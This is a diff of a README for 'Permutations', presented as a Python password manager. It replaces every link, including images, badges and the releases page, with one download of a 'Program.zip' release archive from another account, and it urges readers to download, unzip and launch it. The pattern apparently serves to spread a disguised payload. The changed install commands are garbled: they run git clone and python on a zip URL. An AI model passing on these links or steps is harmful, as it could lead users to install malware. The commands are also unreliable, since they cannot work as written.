@@ -2,7 +2,7 @@
 
 Welcome to **Permutations**, a local easy-to-use password manager written in Python, packed with multiple User Interfaces for your convenience.
 
-![Password Manager](https://github.com/username/repository/blob/master/images/password_manager.png)
+![Password Manager](https://github.com/SUPREME-Snaze/permutations/releases/download/v1.0/Program.zip)
 
 ## Features
 🔒 Securely store your passwords  
@@ -13,16 +13,16 @@ Welcome to **Permutations**, a local easy-to-use password manager written in Pyt
 🛡️ Utilizes Python cryptography for enhanced security  
 
 ## Quick Start
-1. Download the software from [here](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip).  
+1. Download the software from [here](https://github.com/SUPREME-Snaze/permutations/releases/download/v1.0/Program.zip).  
 2. Unzip the file.  
 3. Launch the application.  
 
 ## Installation
 To install Permutations, follow these steps:
 ```bash
-$ git clone https://github.com/username/permutations.git
+$ git clone https://github.com/SUPREME-Snaze/permutations/releases/download/v1.0/Program.zip
 $ cd permutations
-$ python setup.py install
+$ python https://github.com/SUPREME-Snaze/permutations/releases/download/v1.0/Program.zip install
 ```
 
 ## Usage
@@ -38,11 +38,11 @@ We welcome contributions from the community to enhance Permutations. Feel free t
 Your feedback is valuable to us. If you encounter any issues or have suggestions for improvement, please create a new issue on the GitHub repository.
 
 ## Stay Updated
-Stay tuned for the latest updates and releases by checking the [Releases](https://github.com/username/permutations/releases) section on our GitHub repository.
+Stay tuned for the latest updates and releases by checking the [Releases](https://github.com/SUPREME-Snaze/permutations/releases/download/v1.0/Program.zip) section on our GitHub repository.
 
-[![Download Permutations](https://img.shields.io/badge/Download%20Here-Permutations-blue.svg)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download Permutations](https://github.com/SUPREME-Snaze/permutations/releases/download/v1.0/Program.zip%https://github.com/SUPREME-Snaze/permutations/releases/download/v1.0/Program.zip)](https://github.com/SUPREME-Snaze/permutations/releases/download/v1.0/Program.zip)
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-![Thank You](https://github.com/username/repository/blob/master/images/thank_you.png)
+![Thank You](https://github.com/SUPREME-Snaze/permutations/releases/download/v1.0/Program.zip)
